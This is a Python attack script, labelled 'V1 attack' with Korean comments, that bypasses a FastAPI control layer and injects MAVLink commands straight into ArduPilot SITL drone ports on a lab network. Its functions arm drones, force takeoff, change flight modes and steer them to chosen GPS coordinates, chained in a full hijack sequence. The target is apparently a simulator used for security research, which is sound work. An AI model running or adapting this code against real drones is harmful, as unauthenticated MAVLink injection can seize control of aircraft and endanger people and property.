#!/usr/bin/env python3
"""V1 공격: Windows에서 SITL TCP 포트에 직접 MAVLink 주입 (FastAPI 우회)."""
import argparse
import time
from pymavlink import mavutil

DRONE_PORTS = {"drone-01": 25760, "drone-02": 25770, "drone-03": 25780}
SITL_HOST   = "192.168.56.101"

COPTER_MODES = {0:"STABILIZE",3:"AUTO",4:"GUIDED",5:"LOITER",6:"RTL",9:"LAND"}
ACK_RESULTS  = {0:"ACCEPTED",1:"TEMPORARILY_REJECTED",2:"DENIED",3:"UNSUPPORTED",4:"FAILED",5:"IN_PROGRESS"}


# ── 연결 ─────────────────────────────────────────────────────────────────────

def connect(drone_id: str) -> mavutil.mavfile:
    port = DRONE_PORTS[drone_id]
    print(f"[CONNECT] {drone_id} @ {SITL_HOST}:{port} ...")
    conn = mavutil.mavlink_connection(f"tcp:{SITL_HOST}:{port}", source_system=255)

    hb = conn.wait_heartbeat(timeout=10)
    if hb is None:
        print(f"[ERROR]   HEARTBEAT 타임아웃 — SITL 미실행 또는 포트 불일치")
        raise SystemExit(1)

    actual_sysid = conn.target_system
    mode_num     = hb.custom_mode
    armed        = bool(hb.base_mode & 0x80)
    mode_name    = COPTER_MODES.get(mode_num, f"MODE_{mode_num}")

    print(f"[READY]   sysid={actual_sysid} compid={conn.target_component}")
    print(f"[STATE]   mode={mode_name}({mode_num})  armed={armed}")
    print(f"[DEBUG]   MAVLink version={hb.mavlink_version}  autopilot={hb.autopilot}")

    # target_system은 wait_heartbeat()가 설정한 값 그대로 사용
    conn.target_component = 1
    return conn


# ── 디버그: N초 동안 오는 모든 메시지 출력 ──────────────────────────────────

def recv_all(conn: mavutil.mavfile, seconds: float = 3.0, label: str = "") -> list:
    """N초 동안 수신되는 모든 MAVLink 메시지를 출력하고 리스트로 반환."""
    if label:
        print(f"[RECV]    ── {label} (최대 {seconds}s) ──────────────────────")
    deadline = time.time() + seconds
    received = []
    while time.time() < deadline:
        msg = conn.recv_match(blocking=True, timeout=0.3)
        if msg is None:
            continue
        mtype = msg.get_type()
        received.append(msg)

        if mtype == "HEARTBEAT":
            mode_num  = msg.custom_mode
            armed     = bool(msg.base_mode & 0x80)
            mode_name = COPTER_MODES.get(mode_num, f"MODE_{mode_num}")
            print(f"  [MSG] HEARTBEAT  mode={mode_name}({mode_num})  armed={armed}")

        elif mtype == "COMMAND_ACK":
            result_str = ACK_RESULTS.get(msg.result, f"RESULT_{msg.result}")
            print(f"  [MSG] COMMAND_ACK  cmd={msg.command}  result={result_str}  ★")

        elif mtype == "STATUSTEXT":
            print(f"  [MSG] STATUSTEXT  [{msg.severity}] {msg.text.rstrip(chr(0))}")

        elif mtype in ("SYS_STATUS", "GLOBAL_POSITION_INT", "VFR_HUD",
                       "EKF_STATUS_REPORT", "ATTITUDE"):
            pass  # 텔레메트리는 생략

        else:
            print(f"  [MSG] {mtype}")

    if not received:
        print(f"  [RECV] 수신된 메시지 없음 ← 명령이 SITL에 전달되지 않았거나 ACK가 다른 연결로 감")
    return received


# ── 명령 전송 ─────────────────────────────────────────────────────────────────

def send_cmd(conn: mavutil.mavfile, cmd: str, params: dict) -> None:
    ts = conn.target_system
    print(f"[DEBUG]   target_system={ts}  target_component={conn.target_component}")

    if cmd == "ARM":
        conn.mav.command_long_send(ts, 1, 400, 0, 1.0, 21196.0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG ARM (cmd=400, p1=1.0, p2=21196)")

    elif cmd == "DISARM":
        conn.mav.command_long_send(ts, 1, 400, 0, 0.0, 21196.0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG DISARM (cmd=400, p1=0.0, p2=21196)")

    elif cmd == "TAKEOFF":
        alt = float(params.get("alt", 30))
        conn.mav.command_long_send(ts, 1, 22, 0, 0, 0, 0, 0, 0, 0, alt)
        print(f"[SEND]    COMMAND_LONG TAKEOFF (cmd=22, alt={alt}m)")

    elif cmd == "LAND":
        conn.mav.set_mode_send(ts, 1, 9)
        print(f"[SEND]    SET_MODE LAND (set_mode_send  target_sys={ts}  custom_mode=9)")

    elif cmd == "RTL":
        conn.mav.set_mode_send(ts, 1, 6)
        print(f"[SEND]    SET_MODE RTL (set_mode_send  target_sys={ts}  custom_mode=6)")

    elif cmd == "GUIDED":
        conn.mav.set_mode_send(ts, 1, 4)
        print(f"[SEND]    SET_MODE GUIDED (set_mode_send  target_sys={ts}  custom_mode=4)")

    elif cmd == "GOTO":
        lat = int(params["lat"] * 1e7)
        lon = int(params["lon"] * 1e7)
        alt = float(params.get("alt", 30))
        conn.mav.set_position_target_global_int_send(
            0, ts, 1,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            lat, lon, alt,
            0, 0, 0, 0, 0, 0, 0, 0
        )
        print(f"[SEND]    SET_POSITION_TARGET lat={lat/1e7:.6f} lon={lon/1e7:.6f} alt={alt}")
        return


def wait_ack(conn: mavutil.mavfile, timeout: float = 5.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=0.5)
        if msg:
            result_str = ACK_RESULTS.get(msg.result, f"RESULT_{msg.result}")
            print(f"[ACK]     cmd={msg.command} → {result_str}")
            return msg.result == 0
    print(f"[ACK]     타임아웃")
    return False


# ── 전체 공격 시퀀스 ──────────────────────────────────────────────────────────

def attack_sequence(drone_id: str, lat: float, lon: float, alt: float) -> None:
    print(f"\n=== 전체 공격 시퀀스 ===")
    print(f"대상: {drone_id}  목표: lat={lat:.6f} lon={lon:.6f} alt={alt}m\n")

    conn = connect(drone_id)

    print(f"\n[STEP 1] GUIDED 모드 설정")
    send_cmd(conn, "GUIDED", {})
    recv_all(conn, seconds=2.0, label="GUIDED 응답 수신")

    print(f"\n[STEP 2] ARM")
    send_cmd(conn, "ARM", {})
    armed = wait_ack(conn, timeout=5.0)
    if not armed:
        print(f"[WARN]    ARM ACK 없음 — 계속 진행")
    time.sleep(2)

    print(f"\n[STEP 3] TAKEOFF (alt={alt}m)")
    send_cmd(conn, "TAKEOFF", {"alt": alt})
    wait_ack(conn, timeout=5.0)
    print(f"[WAIT]    이륙 대기 5초...")
    time.sleep(5)

    print(f"\n[STEP 4] GOTO lat={lat:.6f} lon={lon:.6f}")
    send_cmd(conn, "GOTO", {"lat": lat, "lon": lon, "alt": alt})
    time.sleep(1)

    conn.close()
    print(f"\n[DONE]    시퀀스 완료")
    print(f"[VERIFY]  → http://{SITL_HOST}:8000/gcs/")


# ── 메인 ──────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="V1 공격: SITL에 직접 MAVLink 명령 주입")
    ap.add_argument("--drone", required=True, choices=list(DRONE_PORTS))
    ap.add_argument("--cmd",   required=True,
                    choices=["ARM","DISARM","TAKEOFF","LAND","RTL","GOTO","GUIDED","SEQUENCE"])
    ap.add_argument("--lat",   type=float, default=37.566535)
    ap.add_argument("--lon",   type=float, default=126.977969)
    ap.add_argument("--alt",   type=float, default=30.0)
    args = ap.parse_args()

    if args.cmd == "SEQUENCE":
        attack_sequence(args.drone, args.lat, args.lon, args.alt)
        return

    print(f"\n=== V1 공격 스크립트 ===")
    print(f"대상: {args.drone}  명령: {args.cmd}")
    print(f"경로: Windows(192.168.56.1) → SITL({SITL_HOST}:{DRONE_PORTS[args.drone]}) [FastAPI 우회]\n")

    conn = connect(args.drone)
    send_cmd(conn, args.cmd, {"lat": args.lat, "lon": args.lon, "alt": args.alt})

    # 명령 전송 후 3초간 오는 모든 메시지 출력 (핵심 디버그)
    recv_all(conn, seconds=3.0, label=f"{args.cmd} 응답 수신")

    conn.close()
    print("\n[DONE]    연결 종료")


if __name__ == "__main__":
    main()
